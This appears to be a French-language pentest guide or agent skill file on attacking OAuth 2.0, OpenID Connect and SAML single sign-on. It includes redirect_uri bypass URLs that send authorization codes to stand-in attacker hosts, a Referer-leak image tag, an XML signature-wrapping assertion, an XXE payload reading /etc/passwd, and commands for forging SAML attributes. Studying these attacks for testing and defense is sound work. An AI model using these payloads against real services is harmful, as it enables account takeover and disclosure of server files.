---
name: oauth-sso-attacks
description: Guide complet des attaques OAuth 2.0, OpenID Connect, SAML et SSO — redirect URI bypass, CSRF, token theft, consent phishing, SAML assertion forging
---

# OAuth 2.0 / SSO — Guide d'Exploitation Avancé

## Références principales
- **PortSwigger OAuth** : https://portswigger.net/web-security/oauth
- **HackTricks OAuth** : https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover/
- **HackTricks SAML** : https://hacktricks.wiki/en/pentesting-web/saml-attacks/

---

## 1. OAuth 2.0 —Vulnérabilités du flux Authorization Code

### 1.1 Redirect URI Bypass

Le paramètre `redirect_uri` est parfois mal validé.

```http
# Acceptation de sous-chemins
https://victim.com/callback
→ Accepte: https://victim.com/callback/attacker

# Path traversal
https://victim.com/callback/../attacker.evil.com/

# Domaine différent si validation partielle
https://victim.com.attacker.com/

# Paramètre supplémentaire
https://victim.com/callback?url=https://attacker.com

# Fragment (#) — le navigateur l'ignore
https://victim.com/callback#https://attacker.com

# Open redirect
https://victim.com/callback?redirect=https://attacker.com
```

**Exploitation** : Envoyer le lien OAuth complet à la victime avec redirect URI modifié → le code d'autorisation est envoyé à l'attaquant.

### 1.2 CSRF sur l'Authorization Code

Absence du paramètre `state` → l'attaquant peut :
1. Démarrer son propre flux OAuth
2. Attacher le compte de la victime à son app malveillante
3. Prendre le contrôle du compte via la session OAuth

```http
GET /auth?client_id=123&redirect_uri=https://app.com/callback&response_type=code&scope=profile
# Pas de paramètre 'state' → vulnérable
```

### 1.3 Vol de Code via Referer

Si l'application charge des ressources tierces (images, scripts), le code d'autorisation peut fuiter via l'en-tête `Referer`.

```html
<!-- Victime connectée, code d'autorisation dans l'URL -->
<img src="https://attacker.com/tracker.png" />
```

### 1.4 Pre-rédirection d'URI

Si l'application enregistre statiquement les `redirect_uri` mais permet une déréférence dynamique :
```http
https://oauth-victim.com/authorize?client_id=123&redirect_uri=https://attacker.com&response_type=code
```

---

## 2. OAuth 2.0 — Implicit Grant (obsolète, mais encore présent)

### 2.1 Vol de Token via Fragment

Le token est dans le fragment de l'URL (`#access_token=...`). Si l'app lit `window.location.hash` sans précaution :

```javascript
// Vulnérable
var hash = window.location.hash.substring(1); // ← lisible par le JS
```

**Exploitation** : XSS sur l'application cliente → accès à `window.location.hash`.

### 2.2 Interception par une autre origine

Si plusieurs applications partagent le même client OAuth, l'une peut intercepter les tokens de l'autre.

---

## 3. OpenID Connect (OIDC)

### 3.1 Nonce Reuse Attack

Absence de validation du `nonce` → rejeu de token ID.

### 3.2 Token Swap / Confusion

Si le même endpoint gère OAuth tokens et OIDC ID tokens :
```http
POST /token
grant_type=authorization_code
code=...
redirect_uri=...
# Attaquant modifie client_id pour recevoir un token d'une audience différente
```

### 3.3 ACR (Authentication Context Class Reference) Bypass

Modifier `acr_values` pour une méthode d'auth plus faible :
```http
GET /authorize?acr_values=urn:mace:incommon:iap:silver
# Changé en : acr_values=urn:mace:incommon:iap:bronze
```

---

## 4. SAML Attacks

### 4.1 Assertion Forgery

```bash
# Décompresser assertion SAML (souvent base64 + deflate)
echo "<base64>" | base64 -d | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"

# Modifier les attributs : <saml:Attribute Name="role"> → admin
# Recompresser
python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.compress(sys.stdin.buffer.read()))" | base64 -w0
```

### 4.2 XML Signature Wrapping

```xml
<!-- Assertion originale -->
<saml:Assertion ID="original">
  <saml:AttributeStatement>
    <saml:Attribute Name="role">user</saml:Attribute>
  </saml:AttributeStatement>
  <ds:Signature>...</ds:Signature>
</saml:Assertion>

<!-- Wrapping : dupliquer avec l'ID malveillante en premier -->
<saml:Assertion ID="malicious">
  <saml:AttributeStatement>
    <saml:Attribute Name="role">admin</saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
<saml:Assertion ID="original">
  <saml:AttributeStatement>
    <saml:Attribute Name="role">user</saml:Attribute>
  </saml:AttributeStatement>
  <ds:Signature>...</ds:Signature>
</saml:Assertion>
```

Si le processeur SAML vérifie la signature sur `original` mais utilise `malicious` pour les attributs → bypass.

### 4.3 Assertion Replay

Rejouer une assertion SAML non expirée au même SP ou à un autre SP.

### 4.4 XML External Entity (XXE) Attack

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Assertion>
  <saml:Attribute Name="email">&xxe;</saml:Attribute>
</saml:Assertion>
```

---

## 5. Consent Phishing

### 5.1 Scope Over-requesting

Certaines applications demandent plus de scopes que nécessaire. Scope `offline_access` → token refresh permanent.

```http
GET /auth?scope=openid%20profile%20email%20offline_access%20admin
```

### 5.2 Typosquatting d'applications OAuth

Créer une application avec le même nom qu'une app légitime.

---

## 6. Outils

```bash
# OAuth Scanner (Burp extension)
# SAML Raider (Burp extension) — manipulation des assertions
# https://portswigger.net/bappstore/21b66a2a7cc248b4bb0b9dcb0c1d8a9f

# SAML toolkit
git clone https://github.com/OWASP/SecurityShepherd.git

# Python SAML manipulation
pip install signxml xmlsec python3-saml

# jwt_tool pour OIDC tokens
python3 jwt_tool.py <jwt_token> -T
```

---

## 7. Checklist détaillée

```
OAUTH 2.0
☐ Redirect URI validation bypass (sous-chemin, traversal, domaine mal formé)
☐ Absence de paramètre state → CSRF
☐ Fuite de code via Referer header
☐ Code d'autorisation réutilisable (expiration ?)
☐ Implicit grant obsolète mais présent
☐ Scope escalation (changer scope après autorisation)
☐ Open redirect sur redirect_uri

OPENID CONNECT
☐ Nonce validation absente
☐ ACR values modifiables
☐ Token confusion (OAuth vs OIDC)
☐ ID token signature non vérifiée

SAML
☐ Assertion forgery (modifier attributs)
☐ Signature wrapping
☐ Rejeu d'assertion
☐ XXE dans assertion
☐ Signature non configurée ✓
☐ Assertion non encryptée

GÉNÉRAL
☐ Multi-SP / IDP confusion
☐ CSRF sur liaison de compte
☐ Clickjacking sur page de consentement
☐ Scope OAuth non validé côté serveur
```